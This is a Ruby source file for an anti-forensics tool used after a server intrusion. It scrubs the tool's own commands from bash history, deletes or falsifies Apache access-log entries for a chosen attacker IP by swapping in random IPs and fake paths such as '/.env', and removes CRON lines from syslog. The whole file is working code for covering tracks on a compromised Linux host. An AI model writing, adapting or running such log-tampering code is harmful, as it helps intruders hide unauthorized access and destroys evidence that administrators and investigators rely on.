require 'ipaddr'
require 'optparse'
require 'fileutils'
#require 'etc'
class BashHistory
    def initialize
        @user = Etc.getlogin
        @hist = "/home/#{@user}/.bash_history"
        @bu   = File.join("/home/#{@user}/.backup")
    end
    def start
        if File.exists?(@hist)
            read = File.read(@hist)
            File.open(@bu, 'w') { |file| file.write(read) }
        end
        remove_s
    end
    def remove_s
        r = "ruby " +  $PROGRAM_NAME
        f = File.read(@bu)
        s = f.split("\n")
        i = 0
        s.each do |x|
            i+=1
            if x.include?(r)
                s.delete(x)
            elsif x.include?("bash s.sh ")
                s.delete(x)
            end
        end
    l = s.reject { |element| element.empty? }
    File.open(@bu, 'w') { |file| file.write(l.join("\n")+"\n") }
    end
    def ends
        if File.exist?(@bu)
            #remove_s
            File.open(@hist, 'w') {|file| file.truncate(0) }
            remove_s    
            File.open(@hist, 'w') { |file| file.write(File.read(@bu)) }
            File.delete(@bu)
        end
    end
end
class Apache2
    def initialize(rip: nil, path: "/.env", meth: "GET", remove: nil, live: true, apache_log: "/var/log/apache2/access.log", tmp_log: "/var/log/apache2/.access.log")
        # replace IP
        @rip  = rip
        @path = path
        @meth = meth
        @live = live
        @apache_log = apache_log
        @tmp_log    = tmp_log
        FileUtils.cp(@apache_log, @tmp_log)
        File.truncate(@apache_log, 0)
    end
    def cleanup
        File.delete(@tmp_log)
    end
    def apache_log=(a)
        @apache_log = a
    end
    def log
        File.readlines(@tmp_log).to_a
    end
    def live=(l)
        @live = l
    end
    def meth=(m)
        @meth = m
    end
    def rip=(i)
        @rip = i
    end
    def path=(pp)
        @path = pp
    end
    def file_write(text)
        if @live
            if File.exists?(@apache_log)
                File.open(@apache_log, 'a') { |file| file.write(text) }
            end
        else
            File.open("access-n.log", 'a') { |file| file.write(text) }
        end
    end
    def remove
        log.each do |l|
            ip = l.split(" ")[0]
            if ip.to_s != @rip
                file_write(l)
            end
        end
    end
    def replace
        log.each do |l|
            ip = l.split(" ")[0]
            if ip.to_s == @rip
                line    = l.split
                line[6] = @path
                line[0] = IPAddr.new(rand(2**32),Socket::AF_INET).to_s
                line[5] = '"' + @meth
                file_write(line.join(" "))
            else
                file_write(l)
            end
        end
    end
end
class SysLog
    def initialize(type: "CRON[", file: "/var/log/syslog", tmp: "/var/log/.syslog")
        # remove line
        @type = type
        @file = file
        @tmp  = tmp
        FileUtils.cp(@file, @tmp)
        File.truncate(@file, 0)
    end
    def type=(t)
        @type = t
    end
    def log
        File.readlines(@tmp).to_a
    end
    def file_write(text)
        File.open(@file, 'a') { |file| file.write(text) }
    end
    def clean
        File.delete(@tmp)
    end
    def remove
        log.each do |i|
            if !i.include?(@type)
                file_write(i)
            end
        end
    clean
    end
end
#LogEditor.new(rip: "135.125.246.189", path: "/robots.txt").replace
options = {}
OptionParser.new do |parser|
  parser.on("--ip [IP]", "change IP") do |ip|
    options[:ip] = ip
  end
  parser.on("--path [PATH]", "change PATH") do |path|
    options[:path] = path
  end
  parser.on("--meth [METH]", "change METHOD") do |m|
    options[:meth] = m
  end
  parser.on("--rm", "remove IP") do |m|
    options[:rm] = m
  end
  parser.on("--start", "Start") do |m|
    options[:start] = true
  end
  parser.on("--end", "Start") do |m|
    options[:end] = true
  end
  parser.on("--syslog", "clean Syslog") do |m|
    options[:syslog] = m
  end
end.parse!
le = Apache2.new(rip: options[:ip], path: options[:path])
if options[:start]
    BashHistory.new.start
end
if options[:end]
    bh = BashHistory.new
    bh.ends
    #bh.remove_s
end
if options[:rm]
    le.remove
end
if options[:ip]
    le.replace
end
if options[:syslog]
    SysLog.new.remove
end